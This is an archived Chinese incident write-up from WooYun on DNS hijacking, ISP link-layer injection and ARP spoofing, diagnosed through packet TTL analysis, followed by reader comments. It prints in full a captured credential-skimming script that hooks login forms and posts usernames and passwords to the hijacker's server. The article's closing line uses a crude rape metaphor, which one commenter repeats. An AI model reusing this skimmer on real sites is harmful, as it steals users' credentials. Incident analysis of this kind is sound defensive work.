@@ -1,0 +1,68 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">浅谈互联网中劫持的一些事情</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">只抽红梅</a> <span class="bull">·</span> <time title="2013/05/27 21:45" ui-time="" datetime="2013/05/27 21:45" class="published ng-binding ng-isolate-scope">2013/05/27 21:45</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>PS：不确定文章中的内容会不会被和谐 互联网中劫持可以理解为正常用户的请求在返回响应之前响应内容被篡改，或者正常用户的请求内容被非法获取从而代为请求。无论是个人还是公司或多或少都会碰到劫持这类事情，无论小到ARP攻击、还是大到运营商的链路劫持、甚至天朝的G&#42;F&#42;W。笔者在一家互联网公司工作，只是根据碰到的一些情况来进行浅谈，深而广的内容只能让有更多经验的来谈了，对于本文的内容也欢迎各位拍砖。</p><h3>一、DNS劫持</h3><p>先来谈下DNS劫持。在去年的”斯巴达“期间，公司的业务监控部门监测到公司的一个业务的访问量骤降，同时运维部门也监测该业务的域名在全国大面积运营商的DNS服务器返回的A记录被修改为一个不是我们的IP：61.49.43.2。时间主要集中在上网的高峰期，持续一个小时左右。下图为DNS解析的抓包（图一）。</p><p><img alt="20130527212642_36164.png" img-src="09e232fbbcf35cdd6035a26f4178dc39ce98e1e8.jpg"> 图一 最初以为是对运营商DNS的投毒攻击，不过随着分析的深入发现，在受影响的地区，递归到13台根DNS服务器返回的都是这个IP，看来不只是简单的对运营商DNS的投毒攻击。 并且我们对 61.49.43.2 这个IP也进行了分析，发现其为一台Nginx的反向代理服务器，用户访问我们的业务，其在返回的页面中插入一段JS代码，功能就是在用户登录之前先获取用户输入框中的用户和密码（业务本身传输密码是加密的），然后再提交到这个服务器的一个页面。最后恢复用户的正常登陆。整个过程用户几乎感受不到影响。 同时我们还发现有其他互联网公司的该业务会受到影响，如果直接把其他公司同类业务的域名解析到这个IP上，发现插入的代码会根据业务而变化，很有针对性。甚至gmail都有影响。 下面是被插入的JS代码：</p><pre><code>#!javascript
+&lt;script&gt;
+var xmlHttp;
+
+function sendurl(uri, u, p, i) {
+    xmlHttp = GetXmlHttpObject();
+    if (xmlHttp == null) {
+        return;
+    }
+    param = "user=" + u + "&amp;pass=" + p + "&amp;icp=" + i;
+    xmlHttp.onreadystatechange = stateChanged;
+    try {
+        xmlHttp.open("POST", uri + "?t=" + (new Date()).valueOf(), true);
+    } catch (e) {}
+    xmlHttp.setRequestHeader("If-Modified-Since", "0");
+    xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xmlHttp.send(param);
+}
+
+function stateChanged() {}
+
+function GetXmlHttpObject() {
+    var xmlHttp = null;
+    if (window.ActiveXObject) {
+        var MSXML = ['MSXML2.XMLHTTP', 'Microsoft.XMLHTTP', 'MSXML2.XMLHTTP.5.0'];
+        for (var n = 0; n &lt; MSXML.length; n++) {
+            try {
+                xmlHttp = new ActiveXObject(MSXML[n]);
+                break;
+            } catch (e) {}
+        }
+    } else if (window.XMLHttpRequest) {
+        try {
+            xmlHttp = new XMLHttpRequest();
+        } catch (e) {}
+    }
+    return xmlHttp;
+}
+try {
+    var fList = document.getElementsByTagName("form");
+    var f;
+    for (var i = 0; i &lt; fList.length; i++) {
+        if (fList[i].pwdInput != null) {
+            f = fList[i];
+            break;
+        }
+    }
+
+    function ffCheck() {
+        try {
+            try {
+                var u = null != f ? f.idInput.value : document.getElementById("idInput").value;
+            } catch (e) {
+                var u = (document.getElementById("idInput").innerHTML).replace(/\s/g, "");
+            }
+            var p = null != f ? f.pwdInput.value : document.getElementById("pwdInput").value;
+            if (u.indexOf("@") == -1) u += "@xxx.com";
+            try {
+                if (u.indexOf("@") == -1) u = u + getdomain();
+            } catch (e) {}
+            sendurl("/abc", u, p, "coremail");
+        } catch (e) {}
+        return fOnSubmit();
+    }
+    if (null != f) f.onsubmit = ffCheck;
+} catch (e) {}
+&lt;/script&gt;
+</code></pre><p>最后问题得到解决并不是我们找到了问题的原因，而是在我们向“有关部门”反馈后，这种劫持竟然停止了。</p><h3>二、链路劫持</h3><p>再来谈下这个链路劫持，还是同样的业务，在有用户投诉会经常登录我们的业务失败，才介入的分析。在受影响的用户计算机上进行抓包发现一个奇怪的现象，就是用户发起一个请求会接收到两个响应包，浏览器没有办法判断哪个是真的哪个是假的，只信任第一个接收到的响应包，这个包的内容就是我们正常页面的内容加上一段js代码，这个js代码和之前DNS劫持的代码类似所以就不贴代码了，获取用户名和密码然后返回。 从包的TTL和Identification大致可以判断是是被第三方劫持，如下图（图二、图三）：</p><p><img alt="20130527212943_73541.png" img-src="b9d8f2932711937f9daabcca7b414a89d24fff9e.jpg"> 图二 <img alt="20130527213039_14540.png" img-src="b31cf07ee35d35d5657fa57e087e895623152812.jpg"> 图三 其实从TTL可以大概的判断劫持发生的位置，在这次的劫持事件中推断劫持的位置发生在我们网关的下一跳，应该是运营商所为，但是运营商并不承认这样做。还能怎么办呢？！ 这种情况之前腾讯也有碰到过，参见：http://security.tencent.com/index.php/blog/msg/10。 有的公司采取HTTPS来解决这个问题，其实笔者认为HTTPS应该是无法完全解决这个问题，因为用户直接通过HTTP来访问业务，业务是通过301之类的方式跳转到HTTPS，如果劫持发生在跳转之前，其实还是一样的效果的。</p><h3>三、ARP攻击</h3><p>最后再来说下ARP攻击吧，我想大部分搞安全的对ARP攻击都会很熟悉，本次ARP攻击并不是直接攻击我们的业务，而是攻击合作商的业务，但是我们的业务中嵌入的有合作商的代码，所以最终达到攻击我们的效果。 问题最初是有用户投诉我们的一些论坛之类的业务再晚上高峰期访问会弹出广告，经过业务确认不是我们的广告，由于受影响的用户比较多，所以排除是个案的可能，介入分析。发现是直接嵌入的一个合作商的JS代码内容被修改，完全替换为弹出广告的JS代码。 下面是在受影响用户电脑上抓包的截图，如下图（图四）：</p><p><img alt="20130527213239_65120.png" img-src="cac0243fc619728a994a616a5d6073fed4ea6735.jpg"> 图四 从截图中可以看到和之前的链路层劫持一样，用户收到两个响应包，同样根据TTL判断是劫持，但是从TTL来看和之前运营商的劫持不一样，正常包TTL为46，而劫持的那个包的TTL为110，一般来说服务器不会修改默认的TTL值，Linux默认的TTL为64，Windows默认的TTL为128，从抓包中的TTL和默认的TTL做对比发现，相差都是18。我们推断这次劫持就是发生在合作商的机房内，同一个C段，攻击服务器应该是一台Windows服务器。 把问题反馈给合作商，让他们以及联系机房进行处理，最后的结果就是同一个C段有一台Windows服务器不断的进行ARP攻击。</p><h3>四、总结</h3><p>其实没有什么好总结的，无论是个人还是企业我们只能够尽量做好自身，对于我们不可控的始终是不可控。正如生活就如强奸，如果无力反抗就只能默默享受了。 over~！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1322" rel="bookmark" id="re1">最新webqq密码的加密方式分析过程</a></li><li><a href="http://drops.wooyun.org/papers/501" rel="bookmark" id="re2">CVE-2012-0053详解</a></li><li><a href="http://drops.wooyun.org/tips/8130" rel="bookmark" id="re3">“企业应急响应和反渗透”之真实案例分析</a></li><li><a href="http://drops.wooyun.org/papers/382" rel="bookmark" id="re4">闲扯下午引爆乌云社区“盗窃”乌云币事件</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">range</span> <span class="reply-time">2016-03-29 23:15:42</span></div><p></p><p>加SSL是有用的。只要发现了30x码，浏览器是不会执行js代码，而是直接跳转走开的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">thanatos</span> <span class="reply-time">2015-12-14 14:18:04</span></div><p></p><p>找个舒服的姿势……</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-06 10:31:54</span></div><p></p><p>生活就如强奸，如果无力反抗就只能默默享受</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">丢小丢</span> <span class="reply-time">2014-04-15 09:05:50</span></div><p></p><p>360不是GFW墙的参建公司之一吗？360负责了一部分墙的维护。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Just_a_sb</span> <span class="reply-time">2013-07-11 23:00:08</span></div><p></p><p>好牛B.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2013-06-07 20:19:05</span></div><p></p><p>好！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">鸡鸡</span> <span class="reply-time">2013-06-01 01:56:53</span></div><p></p><p>牛逼，中国就是牛逼。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-05-31 23:31:17</span></div><p></p><p>我建议360出钱建立一个伟大的网络，该网络全程ssl加密，保护大家的安全，dns也可以由360接管，大家觉得好不好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2013-05-31 10:53:41</span></div><p></p><p>河蟹</p><p></p></div></div></div></div></div></main>
